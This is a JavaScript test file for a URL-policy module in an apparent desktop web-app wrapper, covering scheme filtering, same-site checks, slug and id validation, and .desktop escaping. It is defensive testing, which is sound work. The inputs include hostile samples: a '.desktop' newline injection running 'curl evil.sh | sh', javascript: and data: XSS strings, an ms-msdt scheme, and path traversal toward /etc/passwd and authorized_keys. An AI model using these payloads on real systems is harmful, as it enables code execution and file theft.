const test = require('node:test');
const assert = require('node:assert');
const {
  registrableDomain,
  isWebUrl,
  sameSite,
  normalizeUrl,
  nameFromUrl,
  slugify,
  desktopValue,
  isValidId,
} = require('../src/url-policy');

test('isWebUrl accepts only http and https', () => {
  assert.equal(isWebUrl('https://grok.com'), true);
  assert.equal(isWebUrl('http://localhost:3000/x'), true);

  // The schemes that reach setWindowOpenHandler from hostile page JS.
  assert.equal(isWebUrl('file:///etc/passwd'), false);
  assert.equal(isWebUrl('smb://attacker.example/share'), false);
  assert.equal(isWebUrl('evilscheme://payload?x=1'), false);
  assert.equal(isWebUrl('javascript:alert(1)'), false);
  assert.equal(isWebUrl('data:text/html,<script>alert(1)</script>'), false);
  assert.equal(isWebUrl('ms-msdt:/id PCWDiagnostic'), false);
  assert.equal(isWebUrl('not a url'), false);
  assert.equal(isWebUrl(''), false);
  assert.equal(isWebUrl(null), false);
});

test('registrableDomain handles plain domains', () => {
  assert.equal(registrableDomain('grok.com'), 'grok.com');
  assert.equal(registrableDomain('accounts.google.com'), 'google.com');
  assert.equal(registrableDomain('a.b.c.example.com'), 'example.com');
});

test('registrableDomain does not collapse multi-label public suffixes', () => {
  // The bug this guards: without the suffix list these all return the
  // registry itself, making every site under it "same site".
  assert.equal(registrableDomain('myproject.github.io'), 'myproject.github.io');
  assert.equal(registrableDomain('evil.github.io'), 'evil.github.io');
  assert.equal(registrableDomain('bank.co.uk'), 'bank.co.uk');
  assert.equal(registrableDomain('shop.example.co.uk'), 'example.co.uk');
  assert.equal(registrableDomain('app.herokuapp.com'), 'app.herokuapp.com');
});

test('sameSite keeps auth subdomains in-app', () => {
  assert.equal(sameSite('https://accounts.grok.com/login', 'https://grok.com'), true);
  assert.equal(sameSite('https://grok.com/chat', 'https://grok.com'), true);
  assert.equal(sameSite('https://x.y.grok.com/a', 'https://grok.com/'), true);
});

test('sameSite sends unrelated sites out', () => {
  assert.equal(sameSite('https://evil.example/phish', 'https://grok.com'), false);
  assert.equal(sameSite('https://grok.com.evil.example/', 'https://grok.com'), false);
});

test('sameSite is not fooled by a shared public suffix', () => {
  assert.equal(
    sameSite('https://evil.github.io/phish', 'https://myproject.github.io'),
    false
  );
  assert.equal(sameSite('https://evil.co.uk/phish', 'https://bank.co.uk'), false);
});

test('sameSite refuses non-web schemes outright', () => {
  assert.equal(sameSite('file:///etc/passwd', 'https://grok.com'), false);
  assert.equal(sameSite('smb://host/share', 'https://grok.com'), false);
  assert.equal(sameSite('javascript:alert(1)', 'https://grok.com'), false);
});

test('normalizeUrl accepts what a person types', () => {
  assert.equal(normalizeUrl('grok.com'), 'https://grok.com/');
  assert.equal(normalizeUrl('  grok.com  '), 'https://grok.com/');
  assert.equal(normalizeUrl('http://example.com/a?b=c'), 'http://example.com/a?b=c');
});

test('normalizeUrl rejects non-web and empty input', () => {
  assert.throws(() => normalizeUrl(''), /required/);
  assert.throws(() => normalizeUrl('   '), /required/);
  assert.throws(() => normalizeUrl('file:///etc/passwd'), /http/);
  assert.throws(() => normalizeUrl('javascript://alert(1)'), /http/);
});

test('nameFromUrl derives a readable label', () => {
  assert.equal(nameFromUrl('https://grok.com/'), 'Grok');
  assert.equal(nameFromUrl('https://www.youtube.com/'), 'Youtube');
  assert.equal(nameFromUrl('https://mail.google.com/'), 'Mail');
});

test('slugify produces filesystem-safe ids', () => {
  assert.equal(slugify('My App!'), 'my-app');
  assert.equal(slugify('../../etc/passwd'), 'etc-passwd');
  assert.equal(slugify('...'), 'webapp');
  assert.equal(slugify(''), 'webapp');
  assert.match(slugify('a'.repeat(80)), /^a{32}$/);
});

test('desktopValue collapses characters that would end a .desktop key', () => {
  assert.equal(
    desktopValue('MyApp\nExec=sh -c "curl evil.sh | sh"'),
    'MyApp Exec=sh -c "curl evil.sh | sh"'
  );
  assert.equal(desktopValue('a\r\nb'), 'a b');
  assert.equal(desktopValue('plain name'), 'plain name');
});

test('isValidId accepts generated ids and rejects traversal', () => {
  assert.equal(isValidId('grok-2287'), true);
  assert.equal(isValidId('webapp'), true);

  assert.equal(isValidId('../../.ssh/authorized_keys'), false);
  assert.equal(isValidId('../../../etc/passwd'), false);
  assert.equal(isValidId('a/b'), false);
  assert.equal(isValidId('-leading'), false);
  assert.equal(isValidId('UPPER'), false);
  assert.equal(isValidId(''), false);
  assert.equal(isValidId(null), false);
  assert.equal(isValidId(undefined), false);
});
